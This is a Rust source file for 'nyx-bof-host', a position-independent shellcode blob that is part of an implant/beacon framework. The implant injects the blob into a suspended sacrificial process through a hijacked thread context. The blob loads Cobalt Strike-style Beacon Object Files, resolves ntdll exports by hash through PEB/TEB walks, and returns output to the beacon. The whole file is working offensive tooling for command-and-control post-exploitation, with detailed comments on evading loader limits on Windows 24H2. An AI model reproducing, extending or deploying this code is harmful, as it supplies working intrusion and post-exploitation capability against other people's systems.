//! nyx-bof-host — B3 BOF sacrificial-process host (PIC blob).
//!
//! Standalone `#![no_std]` cdylib compiled to raw position-independent
//! shellcode (`bof-host.bin`, see `regen.sh`) through the same PIC pipeline
//! as the LAYER2 loader (nightly + `x86_64-pc-windows-gnu` + `-Zbuild-std` +
//! dumper reachability extraction). The implant embeds the blob
//! (`include_bytes!` in `bof.rs`), section-delivers it into a suspended
//! sacrificial process whose stdout is a pipe back to the beacon
//! (`inject.rs::create_sacrificial_isolated`), and resumes the main thread at
//! blob offset 0 with `rcx` = packed payload pointer.
//!
//! ## Payload layout (rcx on entry)
//!
//! `[u32 blob_len][COFF blob][u32 args_len][args (CS beacon.h packing)]`
//!
//! The blob runs the COFF exactly like the inline loader (`bof.rs`): parse →
//! W^X section map → relocate → resolve the Beacon-API externals against the
//! Rust shims → call `go(args, alen)`. The difference is the output path:
//! `BeaconPrintf`/`BeaconOutput` write straight to the inherited stdout pipe
//! (`WriteFile(GetStdHandle(STD_OUTPUT_HANDLE))`) instead of a static capture
//! buffer, and the process ends with `ExitProcess(status)` — the parent reads
//! the pipe to EOF and maps a non-zero exit code (crash, loader error) to
//! `Response::Err`.
//!
//! ## Dumper-enforced constraints (see nyx-pic-dumper `relayout.rs`)
//!
//! - **NO writable statics** anywhere in the reachable closure:
//!   - the global allocator ([`minialloc`]) is stateless — kernel32
//!     `GetProcessHeap`/`HeapAlloc`/`HeapFree` are re-resolved per call (no
//!     cached-address atomics like ntalloc's);
//!   - there is no static capture buffer and no static `ARGS_PTR` — the
//!     `BeaconDataParse(NULL, 0)` args fallback reads the args pointer the
//!     entry stashed in the TEB `ArbitraryUserPointer` slot (gs:[0x28]; the
//!     `args_len` u32 sits immediately before the args bytes);
//!   - `BeaconGetSpawnTo` (needs a writable static scratch buffer) is
//!     deliberately NOT in the shim table — a BOF referencing it fails load
//!     with a loud "unresolved external" (isolated mode is a受限交付 subset;
//!     inline execution keeps the full shim set).
//! - **NO static tables holding pointers** (they would emit base relocations
//!   the raw blob cannot fix up): the shim table is a `match` on the external
//!   name, exactly like `bof.rs::beacon_api_addr`.
//! - The shims are only reached **indirectly** (address taken → `lea`), which
//!   the dumper's direct-branch BFS does not follow — [`shim_keepalive`] adds
//!   a never-taken direct call edge to every shim so the closure keeps them.

#![no_std]
#![no_main]
#![feature(alloc_error_handler)]

extern crate alloc;

mod exec;
mod minialloc;
mod shim;

use core::ffi::c_void;

/// Largest COFF blob the host accepts (sanity cap on attacker-influenced
/// input — a real BOF is kilobytes; 16 MiB is generous).
const MAX_BLOB: u32 = 16 * 1024 * 1024;
/// Largest CS-packed args buffer accepted (same rationale).
const MAX_ARGS: u32 = 1024 * 1024;

// Register the stateless process-heap allocator so Vec/String work under
// #![no_std]. Stateless because the PIC dumper refuses writable statics —
// resolution happens per call instead of being cached in atomics (ntalloc's
// pattern, which is unusable here).
#[global_allocator]
static ALLOC: minialloc::ProcessHeapAlloc = minialloc::ProcessHeapAlloc;

#[panic_handler]
fn _panic(_info: &core::panic::PanicInfo) -> ! {
    // Stamp 0xC1 into the payload blob_len field (probe-readable diag),
    // then prefer a clean exit; the parent maps the non-zero code to error.
    stamp_diag(0xC1);
    exit_process(0xC000_0001);
}

#[alloc_error_handler]
fn _alloc_error(_layout: core::alloc::Layout) -> ! {
    stamp_diag(0xC2);
    // Mirrors the implant shell's dedicated OOM exit code (0xAD).
    exit_process(0xAD);
}

/// Resolve `ExitProcess` and leave the process with `code`. Diverges.
fn exit_process(code: u32) -> ! {
    // NtTerminateProcess on NtCurrentProcess: no kernel32 in the child.
    if let Some(addr) = unsafe { crate::export_addr(b"ntdll.dll", b"ntterminateprocess") } {
        let f: extern "system" fn(usize, i32) -> i32 = unsafe { core::mem::transmute(addr) };
        let _ = unsafe { f(!0usize, code as i32) };
    }
    // Defensive trap — only reached if resolution failed (catastrophic).
    // No stamp here: the export_addr classify stamps (0xC4/0xC5/0xC6) must
    // remain visible.
    loop {
        core::hint::spin_loop();
    }
}

/// ntdll export resolution with an LDR-independent fallback.
///
/// Primary path: [`nyx_implant_core::resolve::export_addr`] (PEB -> Ldr
/// InLoadOrderModuleList walk). Fallback: the parent's ntdll base, stashed
/// by [`entry_run`] in the TEB `ReservedForOle` slot (gs:[0x1780]).
///
/// Why ntdll only: a CreateProcessW(SUSPENDED) child that is resumed and
/// hijacked never runs LdrpInitializeProcess — its PEB->Ldr stays NULL and
/// **kernel32 is never even mapped** (proven on windows-latest:
/// NtReadVirtualMemory of the parent's kernel32 base returns
/// STATUS_PARTIAL_COPY, while ntdll — mapped by CreateProcessW itself —
/// reads fine). ntdll's export table is therefore the only reliable
/// resolution source in the child; every bof-host API was migrated to it
/// (Rtl*/Nt* equivalents), and same-boot processes share image bases
/// (boot-level ASLR), so the parent's ntdll base is valid in the child.
///
/// All bof-host lookups route through this (the crate files import
/// `crate::export_addr`), keeping the call sites unchanged.
/// Lowercase a short ASCII name onto a stack buffer (no allocation).
fn ascii_lower(name: &[u8]) -> ([u8; 32], usize) {
    let mut buf = [0u8; 32];
    let n = name.len().min(31);
    for i in 0..n {
        let b = name[i];
        buf[i] = if b.is_ascii_uppercase() { b + 32 } else { b };
    }
    (buf, n)
}

/// Minimal PE-image check: MZ magic + valid e_lfanew + PE signature.
unsafe fn is_pe_image(p: *const u8) -> bool {
    if (p as usize) < 0x10000 {
        return false;
    }
    let mz = *(p as *const u16);
    if mz != 0x5A4D {
        return false;
    }
    let e = *(p.add(0x3C) as *const i32) as usize;
    e < 0x1000 && *(p.add(e) as *const u32) == 0x0000_4550
}

/// Locate ntdll by walking the loader's InLoadOrder list and testing each
/// DllBase (entry+0x30, layout-stable across builds) for the
/// NtQuerySystemInformation export — the base-dll-name fields moved on
/// 24H2, so name matching is unreliable; export probing is not.
unsafe fn ntdll_via_export_walk() -> Option<usize> {
    let peb: usize;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags, readonly),
    );
    if peb == 0 {
        return None;
    }
    let ldr = *((peb as *const u8).add(0x18) as *const usize);
    if ldr == 0 {
        return None;
    }
    let ldr_p = ldr as *const u8;
    let mut flink = *(ldr_p.add(0x10) as *const usize);
    for _ in 0..96 {
        if flink == 0 || flink == ldr + 0x10 {
            return None;
        }
        let flink_p = flink as *const u8;
        let dllbase = *(flink_p.add(0x30) as *const usize);
        if dllbase != 0 && is_pe_image(dllbase as *const u8) {
            if nyx_implant_core::resolve::export_addr_by_hash_pub(
                dllbase as *mut u8,
                nyx_implant_core::resolve::djb2(b"NtQuerySystemInformation"),
            )
            .is_some()
            {
                return Some(dllbase);
            }
        }
        // Advance via InLoadOrderLinks.FLINK (offset 0x0). Reading +0x8
        // follows BLINK — backwards — so the first entry's "next" is the
        // list head and the walk ends after exactly one (exe) entry.
        flink = *(flink_p as *const usize);
    }
    None
}

pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
    // Diagnostic PEB walk: gs:[0x60] -> PEB -> Ldr -> InLoadOrder list.
    // Falls through to resolve::export_addr (which may still succeed) but
    // stamps the failure class for the parent probe.
    let peb_v: u64;
    unsafe {
        core::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb_v,
            options(nostack, preserves_flags, readonly),
        );
    }
    if peb_v == 0 {
        stamp_diag(0xC7);
    } else {
        let ldr_v = unsafe { *(peb_v as *const u64).add(0x18 / 8) };
        if ldr_v == 0 {
            stamp_diag(0xC8);
        } else {
            stamp_diag(0xC9);
        }
    }
    // NO name-based Ldr walk here. `resolve::export_addr` matches modules by
    // hashing UNICODE_STRING name fields at pre-24H2 LDR_DATA_TABLE_ENTRY
    // offsets; on 24H2 those fields moved, so in a fully-initialized child
    // (populated Ldr list) the walk dereferences wild (length, buffer) pairs
    // and AVs the process (root cause of run 31308540437: post-mortem
    // stamp=0xC9 + stage=2 + exit 0xc0000005 — death inside the first
    // export_addr). bof-host only ever resolves ntdll, whose base the parent
    // provides and the fallbacks below locate without any name matching.
    let (lower_buf, lower_len) = ascii_lower(func);
    let lower = &lower_buf[..lower_len];
    // The sacrificial child's loader never runs (kernel32 is not even
    // mapped — proven on windows-latest: reading the parent's kernel32 base
    // in the child returns STATUS_PARTIAL_COPY while ntdll reads fine), so
    // the fallback only serves ntdll, whose base the parent stashed at
    // gs:[0x1780].
    if nyx_implant_core::resolve::djb2(module) != nyx_implant_core::resolve::djb2(b"ntdll.dll") {
        return None;
    }
    let base: u64;
    core::arch::asm!(
        "mov {}, gs:[0x1780]",
        out(reg) base,
        options(nostack, preserves_flags, readonly),
    );
    // Try the parent-provided base first, then — if that missed — locate
    // ntdll from the thread's return address (RtlUserThreadStart lives
    // inside ntdll) and scan downward for the MZ/PE header (the scan stays
    // within ntdll, so no unmapped reads).
    let scan_ntdll = |func_hash: u32| -> Option<usize> {
        let ret: usize;
        core::arch::asm!(
            "mov {}, gs:[0x1798]",
            out(reg) ret,
            options(nostack, preserves_flags, readonly),
        );
        if ret < 0x7FF0_0000_0000 || ret >= 0x8000_0000_0000 {
            return None;
        }
        let mut cand = (ret & !0xFFF) as *mut u8;
        for _ in 0..0x280 {
            let mz = unsafe { *(cand as *const u16) };
            if mz == 0x5A4D {
                let e = unsafe { *(cand.add(0x3C) as *const i32) } as usize;
                if e < 0x1000 {
                    let pe = unsafe { *(cand.add(e) as *const u32) };
                    if pe == 0x0000_4550 {
                        // First MZ/PE found scanning down from a pointer
                        // INSIDE ntdll is ntdll's own base — the export is
                        // either here or nowhere. Continuing below the image
                        // base walks off the mapping and AVs the process
                        // (root cause of run 31308772386's 0xc0000005:
                        // RtlGetProcessHeap unresolvable -> scan undershot).
                        unsafe { diag_u64(3, cand as u64) };
                        return nyx_implant_core::resolve::export_addr_by_hash_pub(cand, func_hash);
                    }
                }
            }
            cand = cand.sub(0x1000);
        }
        None
    };
    // 1) parent-provided base (same-boot ASLR; may differ per-process on 24H2)
    if base != 0 {
        let r = nyx_implant_core::resolve::export_addr_by_hash_pub(
            base as *mut u8,
            nyx_implant_core::resolve::djb2(func),
        )
        .or_else(|| {
            if lower != func {
                nyx_implant_core::resolve::export_addr_by_hash_pub(
                    base as *mut u8,
                    nyx_implant_core::resolve::djb2(lower),
                )
            } else {
                None
            }
        });
        if let Some(a) = r {
            unsafe { diag_u64(0, base) };
            unsafe { diag_u64(1, a as u64) };
            return Some(a);
        }
    }
    unsafe { diag_u64(0, base) };
    // Record the PE-header ingredients the lookup consumed (e_lfanew /
    // magic / export RVA / NumberOfNames as seen from the CHILD) — a correct
    // base with a failing lookup means one of these reads is wrong.
    if base != 0 {
        let b = base as *const u8;
        let e = unsafe { *(b.add(0x3C) as *const i32) } as u32 as u64;
        let nth = unsafe { b.add(e as usize) };
        let magic = unsafe { *(nth.add(24) as *const u16) } as u64;
        let dd = if magic == 0x20B { 112usize } else { 96 };
        let erva = unsafe { *(nth.add(24 + dd) as *const u32) } as u64;
        let non = if erva != 0 {
            (unsafe { *(b.add(erva as usize + 0x18) as *const u32) }) as u64
        } else {
            0
        };
        unsafe { diag_u64(4, e) };
        unsafe { diag_u64(5, magic) };
        unsafe { diag_u64(6, erva) };
        unsafe { diag_u64(7, non) };
        // Deeper replica of export_addr_by_hash_pub's name walk (same reads,
        // child-side) with per-step recording: dir_size / num_funcs /
        // names_rva / ords_rva / target hash / match index+1 / fn_rva /
        // dir_end. Pinpoints whether the hash, the table reads, or the
        // forwarder branch diverges from the (working) parent replica.
        if erva != 0 {
            let dir = unsafe { b.add(erva as usize) };
            let dir_size = (unsafe { *(nth.add(24 + dd + 4) as *const u32) }) as u64;
            let num_funcs = (unsafe { *(dir.add(0x14) as *const u32) }) as u64;
            let names_rva = (unsafe { *(dir.add(0x20) as *const u32) }) as u64;
            let ords_rva = (unsafe { *(dir.add(0x24) as *const u32) }) as u64;
            let target = nyx_implant_core::resolve::djb2(func) as u64;
            unsafe { diag_u64(8, dir_size) };
            unsafe { diag_u64(9, num_funcs) };
            unsafe { diag_u64(10, names_rva) };
            unsafe { diag_u64(11, ords_rva) };
            unsafe { diag_u64(12, target) };
            let names = unsafe { b.add(names_rva as usize) } as *const u32;
            let mut hit = 0u64;
            let mut fn_rva = 0u64;
            for i in 0..(non as usize) {
                let mut p = unsafe { b.add((unsafe { *names.add(i) }) as usize) };
                let mut h: u32 = 5381;
                while unsafe { *p } != 0 {
                    let c = (unsafe { *p }).to_ascii_lowercase() as u32;
                    h = h.wrapping_mul(33).wrapping_add(c);
                    p = unsafe { p.add(1) };
                }
                if h as u64 == target {
                    hit = i as u64 + 1;
                    let ords = unsafe { b.add(ords_rva as usize) } as *const u16;
                    let funcs =
                        unsafe { b.add((unsafe { *(dir.add(0x1C) as *const u32) }) as usize) }
                            as *const u32;
                    let ord = (unsafe { *ords.add(i) }) as usize;
                    if ord < num_funcs as usize {
                        fn_rva = (unsafe { *funcs.add(ord) }) as u64;
                    }
                    break;
                }
            }
            unsafe { diag_u64(13, hit) };
            unsafe { diag_u64(14, fn_rva) };
            unsafe { diag_u64(15, erva + dir_size) };
        }
        // func-slice forensics: is `func` still "ntterminateprocess" in the
        // blob (len + first bytes + independently-computed inline hash)? The
        // djb2 target above (slot 12) was 0xaa264e9e child-side vs
        // 0xffb4438f parent-side — either the literal bytes or resolve::djb2
        // itself is mis-relocated in the dumped blob.
        {
            unsafe { diag_u64(16, func.len() as u64) };
            let mut head = 0u64;
            for (i, &c) in func.iter().take(8).enumerate() {
                head |= (c as u64) << (i * 8);
            }
            unsafe { diag_u64(17, head) };
            let mut h: u32 = 5381;
            for &c in func {
                h = h
                    .wrapping_mul(33)
                    .wrapping_add(c.to_ascii_lowercase() as u32);
            }
            unsafe { diag_u64(18, h as u64) };
        }
    }
    stamp_diag(0xD1); // parent-base miss (post-mortem milestone)
                      // 2) loader-walk by export feature (name fields moved on 24H2)
    let walk_nt = unsafe { ntdll_via_export_walk() };
    unsafe { diag_u64(2, walk_nt.unwrap_or(0) as u64) };
    if let Some(nt) = walk_nt {
        let r = nyx_implant_core::resolve::export_addr_by_hash_pub(
            nt as *mut u8,
            nyx_implant_core::resolve::djb2(func),
        )
        .or_else(|| {
            if lower != func {
                nyx_implant_core::resolve::export_addr_by_hash_pub(
                    nt as *mut u8,
                    nyx_implant_core::resolve::djb2(lower),
                )
            } else {
                None
            }
        });
        if let Some(a) = r {
            return Some(a);
        }
    }
    stamp_diag(0xD2); // export-probe walk miss
                      // 3) thread return address -> ntdll scan (last resort)
    if let Some(r) = scan_ntdll(nyx_implant_core::resolve::djb2(func)) {
        return Some(r);
    }
    if lower != func {
        if let Some(r) = scan_ntdll(nyx_implant_core::resolve::djb2(lower)) {
            return Some(r);
        }
    }
    stamp_diag(0xC5);
    None
}

/// PIC entry point — blob offset 0 after extraction. `packed` (rcx) points at
/// the `[u32 blob_len][blob][u32 args_len][args]` payload the implant appended
/// after the code in the delivered section.
///
/// Ends with `ExitProcess(status)`: the hijacked main thread has no valid
/// caller frame to `ret` into (the implant overwrote Rip at the process-entry
/// thunk), and the exit code is the parent's crash/error signal (0 = clean,
/// 1 = loader error, anything else = the BOF's own ExitProcess / a crash
/// converted by the OS).
///
/// # Safety
/// Called by the implant via a hijacked thread context in a sacrificial
/// process. `packed` must point at the well-formed payload above (the parent
/// built it; the length caps below reject absurd values).
#[no_mangle]
pub unsafe extern "C" fn nyx_bof_host_entry(packed: *const u8) -> ! {
    // Stash the caller's return address (RtlUserThreadStart, in ntdll) at
    // gs:[0x1798] — the fallback export resolution uses it to locate ntdll
    // without the PEB/Ldr walk (24H2 Ldr layout drift broke the walk).
    {
        let ret: usize;
        core::arch::asm!(
            "mov {}, [rsp + 0x28]",
            out(reg) ret,
            options(nostack, preserves_flags, readonly),
        );
        core::arch::asm!(
            "mov qword ptr gs:[0x1798], {}",
            in(reg) ret,
            options(nostack, preserves_flags),
        );
    }
    // Keep the indirectly-reached Beacon-API shims inside the dumper's
    // reachability closure (never executes at runtime — see shim_keepalive).
    shim_keepalive(packed);

    let status = unsafe { entry_run(packed) };
    exit_process(status);
}

/// Write a stage number into the payload's stage slot (the parent reads it
/// back from its local section mapping — pipe-independent progress signal).
unsafe fn set_stage(packed: *const u8, base_off: usize, stage: u64) {
    // Primary: the payload stage slot. Redundant: the blob_len field
    // (payload offset 0) — never re-read after parse, and it gives the
    // parent a zero-layout-change observation point.
    let slot = unsafe { (packed.add(base_off) as *const u64) as *mut u64 };
    unsafe { slot.write_unaligned(stage) };
    let len_slot = packed as *mut u32;
    unsafe { len_slot.write_unaligned(stage as u32) };
}

/// Write a diagnostic marker to the payload's blob_len field via the packed
/// pointer stashed at gs:[0x1790] (probe-readable; zero-layout channel).
fn stamp_diag(v: u32) {
    let packed: usize;
    unsafe {
        core::arch::asm!(
            "mov {}, gs:[0x1790]",
            out(reg) packed,
            options(nostack, preserves_flags, readonly),
        );
    }
    if packed != 0 {
        unsafe { (packed as *mut u32).write_unaligned(v) };
    }
}

/// Write one u64 into the diag record the entry stashed at gs:[0x17A0]
/// (points at payload_trailer_end; the parent reads it back from its local
/// section view — survives the child's death). Slots: [0] gs:[0x1780] as
/// read, [1] parent-base lookup result, [2] export-walk ntdll base,
/// [3] ret-scan image base.
unsafe fn diag_u64(slot: usize, v: u64) {
    let p: usize;
    core::arch::asm!(
        "mov {}, gs:[0x17A0]",
        out(reg) p,
        options(nostack, preserves_flags, readonly),
    );
    if p != 0 {
        unsafe { ((p as *mut u64).add(slot)).write_unaligned(v) };
    }
}

/// Parse the packed payload, stash the args pointer for the dataparse
/// fallback, and run the BOF. Returns the ExitProcess code.
unsafe fn entry_run(packed: *const u8) -> u32 {
    // Diagnostic stash: packed at gs:[0x1790] so panic/alloc/exit handlers
    // can stamp the payload's blob_len field (probe-readable) without TEB
    // base lookups.
    unsafe {
        core::arch::asm!(
            "mov qword ptr gs:[0x1790], {}",
            in(reg) packed as usize,
            options(nostack, preserves_flags),
        );
    }
    if packed.is_null() {
        shim::write_line(b"[bof-host] null payload pointer");
        return 1;
    }
    let blob_len = unsafe { (packed as *const u32).read_unaligned() };
    if blob_len == 0 || blob_len > MAX_BLOB {
        shim::write_line(b"[bof-host] bad blob_len");
        return 1;
    }
    let blob = unsafe { core::slice::from_raw_parts(packed.add(4), blob_len as usize) };
    let args_len_off = 4 + blob_len as usize;
    let args_len = unsafe { (packed.add(args_len_off) as *const u32).read_unaligned() };
    if args_len > MAX_ARGS {
        shim::write_line(b"[bof-host] bad args_len");
        return 1;
    }
    let args_ptr = unsafe { packed.add(args_len_off + 4) };

    // B3 kernel32 fallback base (parent-provided; see [`export_addr`]): the
    // u64 sits right after the packed args. Stash in the TEB ReservedForOle
    // slot (gs:[0x1780]) — nothing else in the sacrificial process uses it.
    // B3 parent-provided bases (see [`export_addr`]): [u64 stage][u64
    // ntdll_base][u64 stdout_handle] sit right after the packed args.
    // Stashed in the TEB slots gs:[0x1780] (ntdll base) and gs:[0x1788]
    // (stdout handle) — nothing else in the sacrificial process uses them.
    // The stage slot is written by `set_stage` below: the parent reads it
    // back from its local section mapping (band-out-of-band progress, since
    // the pipe may be unwritable in some environments).
    let base_off = args_len_off + 4 + args_len as usize;
    // B3 parent-provided bases (see [`export_addr`]): [u64 stage][u64
    // ntdll_base][u64 stdout_handle] sit right after the packed args.
    // Stashed in the TEB slots gs:[0x1780] (ntdll base) and gs:[0x1788]
    // (stdout handle) — nothing else in the sacrificial process uses them.
    // The stage slot is written by `set_stage` below (the parent reads it
    // back from its section view — pipe-independent progress signal).
    if base_off + 24 <= (MAX_ARGS as usize) + 4 + 24 {
        let nt_base = unsafe { (packed.add(base_off + 8) as *const u64).read_unaligned() };
        let out_handle = unsafe { (packed.add(base_off + 16) as *const u64).read_unaligned() };
        if nt_base != 0 {
            unsafe {
                core::arch::asm!(
                    "mov qword ptr gs:[0x1780], {}",
                    in(reg) nt_base,
                    options(nostack, preserves_flags),
                );
            }
        }
        if out_handle != 0 {
            unsafe {
                core::arch::asm!(
                    "mov qword ptr gs:[0x1788], {}",
                    in(reg) out_handle,
                    options(nostack, preserves_flags),
                );
            }
        }
        // Diag-record pointer for export_addr's per-fallback u64 slots
        // (section slack space right after the 24-byte trailer; the probe
        // reads it from its local view).
        unsafe {
            core::arch::asm!(
                "mov qword ptr gs:[0x17A0], {}",
                in(reg) packed.add(base_off + 24) as usize,
                options(nostack, preserves_flags),
            );
        }
    }
    // Stage 1: entry reached + payload parsed.
    set_stage(packed, base_off, 1);

    // Stash the args pointer in the TEB ArbitraryUserPointer slot (gs:[0x28])
    // so BeaconDataParse(NULL, 0) can recover it without a writable static
    // (dumper constraint). The args_len u32 sits immediately before the args
    // bytes, so the shim reads the length from [ptr-4]. The sacrificial
    // process is ours; nothing else uses the slot.
    unsafe {
        core::arch::asm!(
            "mov qword ptr gs:[0x28], {}",
            in(reg) args_ptr as usize,
            options(nostack, preserves_flags),
        );
    }

    set_stage(packed, base_off, 2);
    let r = unsafe { exec::run(blob, args_ptr, args_len as i32) };
    match r {
        Ok(()) => {
            set_stage(packed, base_off, 3);
            0
        }
        Err(msg) => {
            // 0xE1 = exec failed (diagnostic); the message goes to the pipe
            // when the stdout handle slot is present.
            set_stage(packed, base_off, 0xE1);
            shim::write_line(b"[bof-host] ");
            shim::write_line(msg.as_bytes());
            shim::write_line(b"\n");
            1
        }
    }
}

/// Never-taken direct call edges to every Beacon-API shim.
///
/// The PIC dumper builds the blob by walking DIRECT calls/jumps from the
/// entry export. The BOF reaches the shims indirectly — their addresses are
/// taken (`lea`) in [`shim::beacon_api_addr`] and patched into COFF
/// relocations — so without these edges the walk would prune every shim and
/// the `lea` patch step would fail with "references unreachable code". The
/// guard is opaque (`black_box`) and always false at runtime: `packed` is a
/// page-aligned section pointer, never 1. Every shim called here is
/// null-tolerant, so even a hypothetical execution would be harmless.
fn shim_keepalive(packed: *const u8) {
    if core::hint::black_box(packed as usize) != 1 {
        return;
    }
    unsafe {
        shim::BeaconPrintf(0, core::ptr::null(), 0, 0, 0, 0, 0, 0);
        shim::BeaconOutput(0, core::ptr::null(), 0);
        shim::BeaconDataParse(core::ptr::null_mut(), core::ptr::null(), 0);
        shim::BeaconDataExtract(core::ptr::null_mut(), core::ptr::null_mut());
        shim::BeaconGetInt(core::ptr::null_mut());
        shim::BeaconGetShort(core::ptr::null_mut());
        shim::BeaconGetStr(core::ptr::null_mut());
        shim::BeaconDataInt(core::ptr::null_mut());
        shim::BeaconDataShort(core::ptr::null_mut());
        // Pure shims (no memory writes) need their results sunk into
        // black_box: otherwise the optimizer deletes the "dead" keepalive
        // call and the dumper loses the out-of-line body beacon_api_addr
        // lea's (IsAdmin/DataLength fired exactly that gate).
        let _ = core::hint::black_box(shim::BeaconDataLength(core::ptr::null_mut()));
        let _ = core::hint::black_box(shim::BeaconIsAdmin());
        // RevertToken returns nothing — it carries an in-body optimizer
        // barrier instead (see shim.rs).
        shim::BeaconRevertToken();
        shim::BeaconCleanupProcess(core::ptr::null_mut());
        shim::BeaconInformation(core::ptr::null_mut());
        // Also keep the exec stage functions reachable-from-entry honest:
        // (exec::run is a direct call from entry_run, so it and everything it
        // touches is already in the closure — nothing extra needed here.)
        let _ = core::ptr::null::<c_void>();
    }
}
